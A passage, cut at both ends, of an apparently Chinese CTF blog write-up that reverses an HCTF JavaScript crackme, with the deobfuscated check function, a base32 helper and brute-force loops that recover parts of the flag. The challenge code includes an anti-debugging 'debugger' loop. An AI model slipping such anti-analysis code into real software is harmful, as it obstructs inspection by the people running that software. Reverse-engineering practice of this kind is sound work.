&#123;</span><br><span class="line">    var shuzi = parseInt(shuzi, 16);</span><br><span class="line">    var yinshejieguo = shuzu_2[shuzi];</span><br><span class="line">    return yinshejieguo;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后会对数组2做映射</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i &lt; shuzu_2[shuzu_2_yingshe(8)]; i++) &#123;</span><br><span class="line">    str += shuzu_2[shuzu_2_yingshe(&apos;f&apos;)](i)[shuzu_2_yingshe(12)](16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这样的结构，猜想shuzu_2_yingshe(8)应该对应shuzu_2中的length，shuzu_2_yingshe(‘12’)对应toString，结合一开始会以输入对shuzu_2移位，带入hctf{进行测试，结果吻合，说明flag前5位应该就是hctf{</p><p>接下来对所有shuzu_2_yingshe函数映射的地方进行替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line">function check(shuru) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        var shuzu_2 = [</span><br><span class="line">            &apos;code&apos;,</span><br><span class="line">            &apos;version&apos;,</span><br><span class="line">            &apos;error&apos;,</span><br><span class="line">            &apos;download&apos;,</span><br><span class="line">            &apos;invalidMonetizationCode&apos;,</span><br><span class="line">            &apos;substring&apos;,</span><br><span class="line">            &apos;push&apos;,</span><br><span class="line">            &apos;Function&apos;,</span><br><span class="line">            &apos;charAt&apos;,</span><br><span class="line">            &apos;idle&apos;,</span><br><span class="line">            &apos;pyW5F1U43VI&apos;,</span><br><span class="line">            &apos;init&apos;,</span><br><span class="line">            &apos;https://the-extension.com&apos;,</span><br><span class="line">            &apos;local&apos;,</span><br><span class="line">            &apos;storage&apos;,</span><br><span class="line">            &apos;eval&apos;,</span><br><span class="line">            &apos;then&apos;,</span><br><span class="line">            &apos;get&apos;,</span><br><span class="line">            &apos;getTime&apos;,</span><br><span class="line">            &apos;setUTCHours&apos;,</span><br><span class="line">            &apos;url&apos;,</span><br><span class="line">            &apos;origin&apos;,</span><br><span class="line">            &apos;set&apos;,</span><br><span class="line">            &apos;GET&apos;,</span><br><span class="line">            &apos;loading&apos;,</span><br><span class="line">            &apos;status&apos;,</span><br><span class="line">            &apos;removeListener&apos;,</span><br><span class="line">            &apos;onUpdated&apos;,</span><br><span class="line">            &apos;tabs&apos;,</span><br><span class="line">            &apos;callee&apos;,</span><br><span class="line">            &apos;addListener&apos;,</span><br><span class="line">            &apos;onMessage&apos;,</span><br><span class="line">            &apos;runtime&apos;,</span><br><span class="line">            &apos;executeScript&apos;,</span><br><span class="line">            &apos;replace&apos;,</span><br><span class="line">            &apos;data&apos;,</span><br><span class="line">            &apos;test&apos;,</span><br><span class="line">            &apos;includes&apos;,</span><br><span class="line">            &apos;http://&apos;,</span><br><span class="line">            &apos;length&apos;,</span><br><span class="line">            &apos;Url error&apos;,</span><br><span class="line">            &apos;query&apos;,</span><br><span class="line">            &apos;filter&apos;,</span><br><span class="line">            &apos;active&apos;,</span><br><span class="line">            &apos;floor&apos;,</span><br><span class="line">            &apos;random&apos;,</span><br><span class="line">            &apos;charCodeAt&apos;,</span><br><span class="line">            &apos;fromCharCode&apos;,</span><br><span class="line">            &apos;parse&apos;,</span><br><span class="line">            &apos;toString&apos;,</span><br><span class="line">            &apos;substr&apos;,</span><br><span class="line">            &apos;split&apos;</span><br><span class="line">        ];</span><br><span class="line">        var shuru_1 = shuru.substring(0, 4);</span><br><span class="line">        var shuru_2 = parseInt(btoa(shuru_1), 32); // 31</span><br><span class="line"></span><br><span class="line">        (function (shuzu, shuru) &#123;</span><br><span class="line">            var shift = function (i) &#123;</span><br><span class="line">                while (--i) &#123;</span><br><span class="line">                    shuzu.push(shuzu.shift());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            shift(++shuru);</span><br><span class="line">        &#125;(shuzu_2, shuru_2 % 123));</span><br><span class="line">        </span><br><span class="line">        var shuzu_2_yingshe = function (shuzi) &#123;</span><br><span class="line">            var shuzi = parseInt(shuzi, 16);</span><br><span class="line">            var yinshejieguo = shuzu_2[shuzi];</span><br><span class="line">            return yinshejieguo;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        var toHex = function (stri) &#123;</span><br><span class="line">            var str = &apos;0x&apos;;</span><br><span class="line">            for (var i = 0; i &lt; stri.length; i++) &#123;</span><br><span class="line">                str += stri.charCodeAt(i).toString(16);</span><br><span class="line">            &#125;</span><br><span class="line">            return str;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        var shuru_3 = shuru.split(&apos;_&apos;);</span><br><span class="line">        var res = (toHex(shuru_3[0].substr(-2, 2)) ^ toHex(shuru_3[0].substr(4, 1))) % shuru_3[0].length == 5;</span><br><span class="line">        if (!res) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        b2c = function (_0x3f9bc5) &#123;</span><br><span class="line">            var _0x3c3bd8 = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&apos;;</span><br><span class="line">            var _0x4dc510 = [];</span><br><span class="line">            var _0x4a199f = Math[&apos;floor&apos;](_0x3f9bc5[length] / 5);</span><br><span class="line">            var _0x4ee491 = _0x3f9bc5[length] % 5;</span><br><span class="line">            if (_0x4ee491 != 0) &#123;</span><br><span class="line">                for (var _0x1e1753 = 0; _0x1e1753 &lt; 5 - _0x4ee491; _0x1e1753++) &#123;</span><br><span class="line">                    _0x3f9bc5 += &apos;&apos;;</span><br><span class="line">                &#125;</span><br><span class="line">                _0x4a199f += 1;</span><br><span class="line">            &#125;</span><br><span class="line">            for (_0x1e1753 = 0; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) &#123;</span><br><span class="line">                _0x4dc510[push](_0x3c3bd8[charAt](_0x3f9bc5[charCodeAt](_0x1e1753 * 5) &gt;&gt; 3));</span><br><span class="line">                _0x4dc510[push](_0x3c3bd8[charAt]((_0x3f9bc5[charCodeAt](_0x1e1753 * 5) &amp; 7) &lt;&lt; 2 | _0x3f9bc5[charCodeAt](_0x1e1753 * 5 + 1) &gt;&gt; 6));</span><br><span class="line">                _0x4dc510[push](_0x3c3bd8[charAt]((_0x3f9bc5[charCodeAt](_0x1e1753 * 5 + 1) &amp; 63) &gt;&gt; 1));</span><br><span class="line">                _0x4dc510[push](_0x3c3bd8[charAt]((_0x3f9bc5[charCodeAt](_0x1e1753 * 5 + 1) &amp; 1) &lt;&lt; 4 | _0x3f9bc5[charCodeAt](_0x1e1753 * 5 + 2) &gt;&gt; 4));</span><br><span class="line">                _0x4dc510[push](_0x3c3bd8[charAt]((_0x3f9bc5[charCodeAt](_0x1e1753 * 5 + 2) &amp; 15) &lt;&lt; 1 | _0x3f9bc5[charCodeAt](_0x1e1753 * 5 + 3) &gt;&gt; 7));</span><br><span class="line">                _0x4dc510[push](_0x3c3bd8[charAt]((_0x3f9bc5[charCodeAt](_0x1e1753 * 5 + 3) &amp; 127) &gt;&gt; 2));</span><br><span class="line">                _0x4dc510[push](_0x3c3bd8[charAt]((_0x3f9bc5[charCodeAt](_0x1e1753 * 5 + 3) &amp; 3) &lt;&lt; 3 | _0x3f9bc5[charCodeAt](_0x1e1753 * 5 + 4) &gt;&gt; 5));</span><br><span class="line">                _0x4dc510[push](_0x3c3bd8[charAt](_0x3f9bc5[charCodeAt](_0x1e1753 * 5 + 4) &amp; 31));</span><br><span class="line">            &#125;</span><br><span class="line">            var _0x545c12 = 0;</span><br><span class="line">            if (_0x4ee491 == 1)</span><br><span class="line">                _0x545c12 = 6;</span><br><span class="line">            else if (_0x4ee491 == 2)</span><br><span class="line">                _0x545c12 = 4;</span><br><span class="line">            else if (_0x4ee491 == 3)</span><br><span class="line">                _0x545c12 = 3;</span><br><span class="line">            else if (_0x4ee491 == 4)</span><br><span class="line">                _0x545c12 = 1;</span><br><span class="line">            for (_0x1e1753 = 0; _0x1e1753 &lt; _0x545c12; _0x1e1753++)</span><br><span class="line">                _0x4dc510[&apos;pop&apos;]();</span><br><span class="line">            for (_0x1e1753 = 0; _0x1e1753 &lt; _0x545c12; _0x1e1753++)</span><br><span class="line">                _0x4dc510[push](&apos;=&apos;);</span><br><span class="line">            (function () &#123;</span><br><span class="line">                (function _0x3c3bd8() &#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        (function _0x4dc510(_0x460a91) &#123;</span><br><span class="line">                            if ((&apos;&apos; + _0x460a91 / _0x460a91)[&apos;length&apos;] !== 1 || _0x460a91 % 20 === 0) &#123;</span><br><span class="line">                                (function () &#123;</span><br><span class="line">                                &#125;.constructor(&apos;debugger&apos;)());</span><br><span class="line">                            &#125; else &#123;</span><br><span class="line">                                debugger;</span><br><span class="line">                            &#125;</span><br><span class="line">                            _0x4dc510(++_0x460a91);</span><br><span class="line">                        &#125;(0));</span><br><span class="line">                    &#125; catch (_0x30f185) &#123;</span><br><span class="line">                        setTimeout(_0x3c3bd8, 5000);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;());</span><br><span class="line">            &#125;());</span><br><span class="line">            return _0x4dc510[&apos;join&apos;](&apos;&apos;);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        e = toHex(b2c(shuru_3[2]).split(&apos;=&apos;)[0]) ^ 87703346;  // e=1266420339  1313224001 </span><br><span class="line">        if (e != 1266420339) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        f = toHex(b2c(shuru_3[3]).split(&apos;=&apos;)[0]) ^ e; //f=70341426;e=1266420339  1330469185</span><br><span class="line">        if (f != 70341426) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        n = f * e * shuru_3[0].length; //f=70341426;e=1266420339;</span><br><span class="line">        h = function (input, func) &#123;</span><br><span class="line">            var str = &apos;&apos;;</span><br><span class="line">            for (var i = 0; i &lt; input.length; i++) &#123;</span><br><span class="line">                str += func(input[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            return str;</span><br><span class="line">        &#125;;</span><br><span class="line">        j = shuru_3[1].split(&apos;3&apos;);</span><br><span class="line">        if (j[0].length != j[1].length || (toHex(j[0]) ^ toHex(j[1])) != 5651) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        k = alpha =&gt; alpha.charCodeAt() * shuru_3[1].length;</span><br><span class="line">        l = h(j[0], k);</span><br><span class="line">        if (l != 798707826) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        m = toHex(shuru_3[4].substr(0, 4)) - 1218466658 == n % l; //l=798707826;m=1</span><br><span class="line">        function repeat(input, i) &#123;</span><br><span class="line">            var str = &apos;&apos;;</span><br><span class="line">            for (var j = 0; j &lt; i; j++) &#123;</span><br><span class="line">                str += input;</span><br><span class="line">            &#125;</span><br><span class="line">            return str;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!m || repeat(shuru_3[4].substr(5, 1), 2) == shuru_3[4].substr(-5, 4) || (shuru_3[4].substr(-2, 1) - shuru_3[4].substr(4, 1)) != 1) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        o = toHex(shuru_3[4].substr(6, 2)).substr(2) == shuru_3[4].substr(6, 1).charCodeAt() * shuru_3[4].length * 5;</span><br><span class="line">        return o &amp;&amp; shuru_3[4].substr(4, 1) == 2 &amp;&amp; shuru_3[4].substr(6, 2) == repeat(shuru_3[4].substr(7, 1), 2);</span><br><span class="line">    &#125; catch (_0x4cbb89) &#123;</span><br><span class="line">        console.log(&apos;gg&apos;);</span><br><span class="line">        return ![];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function test() &#123;</span><br><span class="line">    var val = document.getElementById.(&apos;message&apos;).value;</span><br><span class="line">    if (val == &apos;&apos;) &#123;</span><br><span class="line">        console[&apos;log&apos;](&apos;Welcome to HCTF:&gt;&apos;);</span><br><span class="line">        return ![];</span><br><span class="line">    &#125;</span><br><span class="line">    var result = check(val);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">        alert(&apos;Congratulations! you got it!&apos;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        alert(&apos;Sorry, you are wrong...&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">window.onload = function () &#123;</span><br><span class="line">    // setInterval(&apos;window.console.clear();window.console.log(&apos;Welcome to HCTF :&gt;&apos;)&apos;, 50);</span><br><span class="line">    test();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着分析check内的判断条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var shuru_3 = shuru.split(&apos;_&apos;);</span><br></pre></td></tr></table></figure><p>输入以_分割分为5部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var res = (toHex(shuru_3[0].substr(-2, 2)) ^ toHex(shuru_3[0].substr(4, 1))) % shuru_3[0].length == 5;</span><br><span class="line">        if (!res) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可知res不能为0，而shuru_3[0].length无法得知，继续往下看</p><p>遇到了b2c函数，变换十分复杂，其中出现了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var _0x3c3bd8 = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&apos;;</span><br></pre></td></tr></table></figure><p>还是师兄见多识广，看出了它是base32变换</p><p>其实不管它是何种变换，根据后面的判断提示直接调用函数，只需要函数结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">j = shuru_3[1].split(&apos;3&apos;);</span><br><span class="line">if (j[0].length != j[1].length || (toHex(j[0]) ^ toHex(j[1])) != 5651) &#123;</span><br><span class="line">    return ![];</span><br><span class="line">&#125;</span><br><span class="line">        k = alpha =&gt; alpha.charCodeAt() * shuru_3[1].length;</span><br><span class="line">        l = h(j[0], k);</span><br><span class="line">        if (l != 798707826) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        h = function (input, func) &#123;</span><br><span class="line">            var str = &apos;&apos;;</span><br><span class="line">            for (var i = 0; i &lt; input.length; i++) &#123;</span><br><span class="line">                str += func(input[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            return str;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>可知输入第二部分以3分为两半，两边长度相等，toHex(j[0]) ^ toHex(j[1])) == 5651 ==&gt; 经过测试确定两边长度为2或3，分为以此为条件带入下面的等式“爆破”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">h = function (input, func) &#123;</span><br><span class="line">    var str = &apos;&apos;;</span><br><span class="line">    for (var i = 0; i &lt; input.length; i++) &#123;</span><br><span class="line">        str += func(input[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">&#125;;</span><br><span class="line">f = alpha =&gt; alpha.charCodeAt() * 7;</span><br><span class="line">var toHex = function (stri) &#123;</span><br><span class="line">    var str = &apos;0x&apos;;</span><br><span class="line">    for (var i = 0; i &lt; stri.length; i++) &#123;</span><br><span class="line">        str += stri.charCodeAt(i).toString(16);</span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">&#125;;</span><br><span class="line">a = &apos;=ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&apos;</span><br><span class="line">for (var i = a.length - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">      for (var j = a.length - 1; j &gt;= 0; j--) &#123;</span><br><span class="line">            for (var k = a.length - 1; k &gt;= 0; k--) &#123;</span><br><span class="line">                  for (var q = a.length - 1; q &gt;= 0; q--) &#123;</span><br><span class="line">                        if((toHex(a[q]+a[k]) ^ toHex(a[i]+a[j])) == 5651)&#123;</span><br><span class="line">                              for (var z = a.length - 1; z &gt;= 0; z--) &#123;</span><br><span class="line">                                    if ((h(a[z]+a[q]+a[k], f)) == 798707826) &#123;</span><br><span class="line">                                          console.log(a[z]+a[q]+a[k])</span><br><span class="line">                                          console.log(a[z]+a[i]+a[j])</span><br><span class="line">                              &#125;</span><br><span class="line">                              &#125;</span><br><span class="line"></span><br><span class="line">                  &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>丢进浏览器跑，得到输入第二部分为rev3rse</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e = toHex(b2c(shuru_3[2]).split(&apos;=&apos;)[0]) ^ 87703346;  // e=1266420339  1313224001 </span><br><span class="line">if (e != 1266420339) &#123;</span><br><span class="line">    return ![];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三四部分更简单了，同样直接爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">toHex(b2c(shuru_3[2]).split(&apos;=&apos;)[0]) == 1313224001</span><br><span class="line">a = &apos;=ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&apos;</span><br><span class="line">for (var i = a.length - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">      for (var j = a.length - 1; j &gt;= 0; j--) &#123;</span><br><span class="line">            if(toHex(b2c(a[i]+a[j]).split(&apos;=&apos;)[0]) == 1313224001)&#123;</span><br><span class="line">                  console.log(a[i]+a[j]);</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">for (var i = a.length - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">      for (var j = a.length - 1; j &gt;= 0; j--) &#123;</span><br><span class="line">            if(toHex(b2c(a[i]+a[j]).split(&apos;=&apos;)[0]) == 1330469185)&#123;</span><br><span class="line">                  console.log(a[i]+a[j]);</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">var toHex = function (stri) &#123;</span><br><span class="line">    var str = &apos;0x&apos;;</span><br><span class="line">    for (var i = 0; i &lt; stri.length; i++) &#123;</span><br><span class="line">        str += stri.charCodeAt(i).toString(16);</span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">&#125;;</span><br><span class="line">b2c = function (_0x3f9bc5) &#123;</span><br><span class="line">    var _0x3c3bd8 = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&apos;;</span><br><span class="line">    var _0x4dc510 = [];</span><br><span class="line">    var _0x4a199f = Math.floor(_0x3f9bc5.length / 5);</span><br><span class="line">    var _0x4ee491 = _0x3f9bc5.length % 5;</span><br><span class="line">    if (_0x4ee491 != 0) &#123;</span><br><span class="line">        for (var _0x1e1753 = 0; _0x1e1753 &lt; 5 - _0x4ee491; _0x1e1753++) &#123;</span><br><span class="line">            _0x3f9bc5 += &apos;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        _0x4a199f += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    for (_0x1e1753 = 0; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) &#123;</span><br><span class="line">        _0x4dc510.push(_0x3c3bd8.charAt(_0x3f9bc5.charCodeAt(_0x1e1753 * 5) &gt;&gt; 3));</span><br><span class="line">        _0x4dc510.push(_0x3c3bd8.charAt((_0x3f9bc5.charCodeAt(_0x1e1753 * 5) &amp; 7) &lt;&lt; 2 | _0x3f9bc5.charCodeAt(_0x1e1753 * 5 + 1) &gt;&gt; 6));</span><br><span class="line">        _0x4dc510.push(_0x3c3bd8.charAt((_0x3f9bc5.charCodeAt(_0x1e1753 * 5 + 1) &amp; 63) &gt;&gt; 1));</span><br><span class="line">        _0x4dc510.push(_0x3c3bd8.charAt((_0x3f9bc5.charCodeAt(_0x1e1753 * 5 + 1) &amp; 1) &lt;&lt; 4 | _0x3f9bc5.charCodeAt(_0x1e1753 * 5 + 2) &gt;&gt; 4));</span><br><span class="line">        _0x4dc510.push(_0x3c3bd8.charAt((_0x3f9bc5.charCodeAt(_0x1e1753 * 5 + 2) &amp; 15) &lt;&lt; 1 | _0x3f9bc5.charCodeAt(_0x1e1753 * 5 + 3) &gt;&gt; 7));</span><br><span class="line">        _0x4dc510.push(_0x3c3bd8.charAt((_0x3f9bc5.charCodeAt(_0x1e1753 * 5 + 3) &amp; 127) &gt;&gt; 2));</span><br><span class="line">        _0x4dc510.push(_0x3c3bd8.charAt((_0x3f9bc5.charCodeAt(_0x1e1753 * 5 + 3) &amp; 3) &lt;&lt; 3 | _0x3f9bc5.charCodeAt(_0x1e1753 * 5 + 4) &gt;&gt; 5));</span><br><span class="line">        _0x4dc510.push(_0x3c3bd8.charAt(_0x3f9bc5.charCodeAt(_0x1e1753 * 5 + 4) &amp; 31));</span><br><span class="line">    &#125;</span><br><span class="line">    var _0x545c12 = 0;</span><br><span class="line">    if (_0x4ee491 == 1)</span><br><span class="line">        _0x545c12 = 6;</span><br><span class="line">    else if (_0x4ee491 == 2)</span><br><span class="line">        _0x545c12 = 4;</span><br><span class="line">    else if (_0x4ee491 == 3)</span><br><span class="line">        _0x545c12 = 3;</span><br><span class="line">    else if (_0x4ee491 == 4)</span><br><span class="line">        _0x545c12 = 1;</span><br><span class="line">    for (_0x1e1753 = 0; _0x1e1753 &lt; _0x545c12; _0x1e1753++)</span><br><span class="line">        _0x4dc510[&apos;pop&apos;]();</span><br><span class="line">    for (_0x1e1753 = 0; _0x1e1753 &lt; _0x545c12; _0x1e1753++)</span><br><span class="line">        _0x4dc510.push(&apos;=&apos;);</span><br><span class="line">    return _0x4dc510.join(&apos;&apos;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n = f * e * shuru_3[0].length; //f=70341426;e=1266420339;</span><br><span class="line">m = toHex(shuru_3[4].substr(0, 4)) - 1218466658 == n % l; //l=798707826;m=1</span><br><span class="line">if (!m || repeat(shuru_3[4].substr(5, 1), 2) == shuru_3[4].substr(-5, 4) || (shuru_3[4].substr(-2, 1) - shuru_3[4].substr(4, 1)) != 1) &#123;</span><br><span class="line">    return ![];</span><br><span 